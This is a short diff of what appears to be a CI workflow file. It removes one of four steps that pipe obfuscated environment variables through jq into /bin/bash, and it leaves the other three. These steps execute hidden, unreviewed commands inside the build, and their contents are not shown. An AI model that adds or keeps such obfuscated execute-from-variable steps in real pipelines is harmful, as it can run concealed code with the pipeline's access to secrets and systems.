@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$txcla61" | jq -r .dckb825 | /bin/bash
           printf '%s' "$urndz94539" | jq -r .hyz492 | /bin/bash
-          echo $yhv7 | jq -r .eptk18163 | /bin/bash
           printf '%s' "$qkkf2" | jq -r .j365 | /bin/bash
 
       - name: Store results
